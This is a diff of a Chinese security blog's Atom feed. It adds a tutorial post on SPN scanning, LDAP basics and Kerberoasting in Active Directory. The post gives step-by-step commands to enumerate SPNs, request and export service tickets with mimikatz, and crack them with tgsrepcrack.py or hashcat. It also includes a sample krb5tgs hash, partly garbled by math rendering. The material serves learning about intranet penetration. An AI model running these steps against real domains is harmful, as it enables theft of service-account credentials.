@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://x1hy9.github.io</id>
     <title>Kimengun的学习之路</title>
-    <updated>2021-02-17T11:26:24.319Z</updated>
+    <updated>2021-02-17T14:19:24.872Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://x1hy9.github.io"/>
     <link rel="self" href="https://x1hy9.github.io/atom.xml"/>
@@ -10,6 +10,158 @@
     <logo>https://x1hy9.github.io/images/avatar.png</logo>
     <icon>https://x1hy9.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Kimengun的学习之路</rights>
+    <entry>
+        <title type="html"><![CDATA[内网渗透中-Kerberos协议中SPN的应用]]></title>
+        <id>https://x1hy9.github.io/post/nei-wang-shen-tou-zhong-kerberos-xie-yi-zhong-spn-de-ying-yong/</id>
+        <link href="https://x1hy9.github.io/post/nei-wang-shen-tou-zhong-kerberos-xie-yi-zhong-spn-de-ying-yong/">
+        </link>
+        <updated>2021-02-17T14:14:33.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="11-spn">1.1 SPN</h2>
+<p>SPN：服务主体名称。使用Kerberos须为服务器注册SPN，因此可以在内网中扫描SPN，快速寻找内网中注册的服务，SPN扫描可以规避像端口扫描的不确定性探测动作。主要利用工具有：setspn、GetUserSPNs.vbs和Rubeus。<br>
+a、利用Windows自带的setspn工具，普通域用户权限执行即可：</p>
+<blockquote>
+<p>setspn -T domain.com -Q <em>/</em></p>
+</blockquote>
+<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613562992518-d52fce69-8ae3-4af8-a936-c8a10ac34528.png" alt="" loading="lazy"><br>
+在上述截图中可以清晰的看到DCServer机器上运行了dns服务。如果网内存在mssql，利用SPN扫描也可以得到相应的结果。</p>
+<h3 id="0x02-spn扫描">0x02 SPN扫描</h3>
+<p>spn扫描也可以叫扫描Kerberos服务实例名称，在Active Directory环境中发现服务的最佳方法是通过“SPN扫描”。通过请求特定SPN类型的服务主体名称来查找服务，SPN扫描攻击者通过网络端口扫描的主要好处是SPN扫描不需要连接到网络上的每个IP来检查服务端口。SPN扫描通过LDAP查询向域控制器执行服务发现。由于SPN查询是普通Kerberos票据的一部分，因此如果不能被查询，但可以用网络端口扫描来确认。对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测</p>
+<h4 id="1spn格式">1.SPN格式</h4>
+<p>SPN = serviceclass “/” hostname [“:”port] [“/” servicename]<br>
+serviceclass = mssql<br>
+servicename =sql.bk.com<br>
+其中：<br>
+serviceclass:标识服务类的字符串，例如Web服务的www<br>
+hostname:一个字符串，是系统的名称。这应该是全限定域名（FQDN）。<br>
+port:一个数字，是该服务的端口号。<br>
+servicename:一个字符串，它是服务的专有名称（DN），objectGuid，Internet主机名或全限定域名（FQDN）。<br>
+注意: 服务类和主机是必需参数，但 端口和服务名是可选的，主机和端口之间的冒号只有当端口存在时才需要</p>
+<h4 id="2常见服务和spn服务实例名称">2.常见服务和spn服务实例名称</h4>
+<p>MSSQLSvc/adsmsSQLAP01.adsecurity.org:1433<br>
+Exchange<br>
+exchangeMDB/adsmsEXCAS01.adsecurity.org<br>
+RDP<br>
+TERMSERV/adsmsEXCAS01.adsecurity.org<br>
+WSMan / WinRM / PS Remoting<br>
+WSMAN/adsmsEXCAS01.adsecurity.org<br>
+Hyper-V Host<br>
+Microsoft Virtual Console Service/adsmsHV01.adsecurity.org<br>
+VMWare VCenter<br>
+STS/adsmsVC01.adsecurity.org</p>
+<h1 id="ldap协议">LDAP协议</h1>
+<p>LDAP全称是Lightweight Directory Access Protocol，轻量目录访问协议。是一种用来查询与更新 Active Directory 的目录服务通信协议。AD 域服务利用 LDAP 命名路径（LDAP naming path）来表示对象在 AD 内的位置，以便用它来访问 AD 内的对象。<br>
+搬运daiker大佬文章中LDAP的介绍: <a href="https://www.anquanke.com/post/id/195100?from=singlemessage#h2-1">https://www.anquanke.com/post/id/195100?from=singlemessage#h2-1</a><br>
+<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564378225-1078dbe2-6532-44ce-9c2f-5fbffc6d13d2.png" alt="" loading="lazy"></p>
+<ul>
+<li>目录树：如上图所示，在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目。</li>
+<li>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）。比如图中的每个圆圈都是一条记录。</li>
+<li>DN,RDN:比如说第一个叶子条目，他有一个唯一可区分的名称– —</li>
+<li>DN:uid=bob,ou=people,dc=acme,dc=org。类似于文件目录的相对路径绝对路径，他除了有个DN之外，还有个RDN，他与目录结构无关，比如之前咱们提过的uid=bob,ou=people,dc=acme,dc=org，他的RDN就是uid=bob</li>
+<li>属性：描述条目具体信息。比如 uid=bill,ou=people,dc=acme,dc=org，他有属性name 为bill，属性age为11，属性school 为xx。</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376610-ea6dc241-eb73-43e9-9282-5f72091d4fa7.png" alt="" loading="lazy"></figure>
+<h1 id="kerberoasting">Kerberoasting</h1>
+<p>介绍 Kerberos 的认证流程时说到，在 KRB_TGS_REP 中，TGS 会返回给 Client 一张票据 ST，而 ST 是由 Client 请求的 Server 端密码进行加密的。当 Kerberos 协议设置票据为 RC4 方式加密时，我们就可以通过爆破在 Client 端获取的票据 ST，从而获得 Server 端的密码。<br>
+下图为设置 Kerberos 的加密方式为RC4，在域中可以在域控的「本地安全策略」中进行设置：<br>
+<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376496-12278a0b-e71b-4b15-a2de-a7e22282191f.png" alt="" loading="lazy"><br>
+设置完成之后运行里输入「gpupdate」刷新组策略，策略生效。</p>
+<h2 id="kerberoasting攻击方式一">Kerberoasting攻击方式一</h2>
+<p>获得有价值的SPN<br>
+需要满足以下条件：</p>
+<table>
+<thead>
+<tr>
+<th>该SPN注册在域用户帐户(Users)下域用户账户的权限很高</th>
+</tr>
+</thead>
+<tbody></tbody>
+</table>
+<p>1.获取SPN<br>
+powershell:<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a><br>
+vbs:<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>cscript GetUserSPNs.vbs</th>
+</tr>
+</thead>
+<tbody></tbody>
+</table>
+<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564377810-7553d523-9081-40a6-85cd-640e4a7b04e6.png" alt="" loading="lazy"><br>
+2.根据扫描出的结果使用微软提供的类 KerberosRequestorSecurityToken 发起 kerberos 请求，申请 ST 票据。</p>
+<table>
+<thead>
+<tr>
+<th>Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-Web-Kit.rootkit.org&quot;</th>
+</tr>
+</thead>
+<tbody></tbody>
+</table>
+<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564377285-96827fe6-b74a-4654-8b79-999772370171.png" alt="" loading="lazy"><br>
+3.Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据。</p>
+<table>
+<thead>
+<tr>
+<th>klist</th>
+</tr>
+</thead>
+<tbody></tbody>
+</table>
+<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564377544-e856427d-1eff-44b8-b969-1f99c62eb28e.png" alt="" loading="lazy"><br>
+4.mimicatz导出</p>
+<table>
+<thead>
+<tr>
+<th>rberos::list /export</th>
+</tr>
+</thead>
+<tbody></tbody>
+</table>
+<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376510-f9a81a18-3f70-466f-b6ae-9f0f235b6448.png" alt="" loading="lazy"><br>
+5.爆破密码<br>
+脚本:<a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
+<table>
+<thead>
+<tr>
+<th>python2 tgsrepcrack.py wordlist.txt 1-40a10000-jerry@MSSQLSvc~Srv-Web-Kit.rootkit.org-ROOTKIT.ORG.kirbi</th>
+</tr>
+</thead>
+<tbody></tbody>
+</table>
+<h2 id="kerberoasting攻击方式二">Kerberoasting攻击方式二</h2>
+<p>Kerberoasting攻击方式一中需要通过 mimikatz 从内存中导出票据，Invoke-Kerberoast 通过提取票据传输时的原始字节，转换成 John the Ripper 或者 HashCat 能够直接爆破的字符串。<br>
+自动实现，并且不需要mimikatz，普通用户权限即可，参考资料<br>
+<a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a><br>
+脚本地址：<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1</a></p>
+<p>| Import-module .\Invoke-Kerberoast.ps1Invoke-kerberoast -outputformat hashcat |fl |<br>
+| --- |</p>
+<p>–outputformat 参数可以指定输出的格式，可选 John the Ripper 和 Hashcat 两种格式<br>
+<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376663-d8583c68-58ac-49bf-a7ee-4a3b7c0e81e8.png" alt="" loading="lazy"><br>
+利用hashcat爆破<br>
+工具下载:<a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p>
+<table>
+<thead>
+<tr>
+<th>hashcat64.exe  -m 13100 hash.txt dic.txt --force --show</th>
+</tr>
+</thead>
+<tbody></tbody>
+</table>
+<p>hash.txt内容</p>
+<table>
+<thead>
+<tr>
+<th>$krb5tgs<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>23</mn></mrow><annotation encoding="application/x-tex">23</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">3</span></span></span></span><em>dbadmin<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>o</mi><mi>o</mi><mi>t</mi><mi>k</mi><mi>i</mi><mi>t</mi><mi mathvariant="normal">.</mi><mi>o</mi><mi>r</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">rootkit.org</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord">.</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span>MSSQLSvc/Srv-Web-Kit.rootkit.org:1433</em>$d78f3a872b2e770bd7fed0a08386d791$2a356ecded8ad719cde070eb0c25bd1126dce5017acfb219135760a3890428da51667504789cb12c15fa61c71209ffc3ed0cd1d7e08cbeb4bb2bbc84d42bac53f4030bbf8fff011bcfcd76e2448f8b34f1431da0ba5f373c737d12004562b4242b099c2f27797cd682902f70f356f5fa629ea7c55458ebd230eaa19c56f596e1e1e6e2d37887bddca6243661c3d1d8e69420a3ab4427c56859d3858f6b4283fc268a1f4af161771d37858226a4d640f0cb45648760d7c5698cfbcc1e53003277e462937d09da38e8c1bfd698e6d6db5fc184fa9166c5bf8002cb061b53187612d597ad3a547b4a2b6cd474bcb894c6d1ff021299882dd4ba9d37fe5543bbb205b5941cb24891f3f1733dd012dda97a81d8cb0206bfca3b9ae8a0087466fb91b1bea820a3608f71eb90a50d46ca1944816242d75ddae569cdf33bad5fb8f5703c252dbfce22cfa8ab268d16671020044282f88119854a01500216364329e89b37367516d0f21f9d2f6b20b886e3a01424b90431ffc7782a21a6befe40514cdfb704c29a2bd25078e821209d914df46fb11c997c7cf9e0ec94c036466cd51351c132304ff8a2bbdd8120a955b7ef764169193c8915dc123d6c339a5c2d7bae301f0effdaaa604cc84a4f36f005bbbf64f1cb276b265fc953e7b3c09cdbc4ec102edd8907fcf812088e7ab7ab1d3d1efe07c899f9f590ee1a8fa7714e5b5e7b82b072aa46dae2bf9566cca99877932021b506ddb51e3162a576e155ff0c40e6eb1546b7713d355475c4df227864e4a3e7d12c3c0d6f1020f738b041c4717aa626ef8a3c9974bda28f2d058dfc2a90bd6aea7a6352c07999744e9b936b34b372ffd85153bec7ea17c80cab0ab0f165b638fc43917df16c8dc37d664d952cb615bbf95809bcc046761cefc39eb01b2b0160d31701ed33f3d9ffafafbf931c3f698ab57550da5fb50b009aa27e1dcb3fdfcf9d68b44882b065dedb15252c3762b2ff98c197e87f4a04831ed8dda78e71a9744a655fde06064a8a7b19caa0845436ceadc279e3d50fb21982d9303f96470705f85f4ab1544d54f2a39f98fc5bcab97ad124b7aeffb45ccb356c043ee2949bdffb1fe0607b608051bc300b736d1add8f2cf50f508fe8b3e624f1d512cff8ed1f894a2836ea9fc960c5a87933f793a1f059f51d640353e01eedfaf5b41a60ba2b779d7e27e29d83fc584cb3ad7c52d746c1fd1d8b38840d3533e9ab0dc96110d509ab41735253a3354c3bcaa97acde9f6f2d9abe6ca1cea1e4b9df500b0567215571d8360f5f55b1dda171c2db476e2888eee7dfefb9a22909729350a4307d1f606a5ddb615a29ea3b54194f216f92c2161e3d998044c811675e86f913140e0e2d290da20141a9fe488ea715c1562f6425e30b54261e44b8e83430456c2b11e08d227b209f4c992089d8ac633e59d0ccbe15e5c06</th>
+</tr>
+</thead>
+<tbody></tbody>
+</table>
+<p>爆破结果<br>
+<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376692-eef989aa-ad92-4f35-b711-836e51824235.png" alt="" loading="lazy"><br>
+**</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[内网渗透主机发现技巧]]></title>
         <id>https://x1hy9.github.io/post/nei-wang-shen-tou-zhu-ji-fa-xian-ji-qiao/</id>
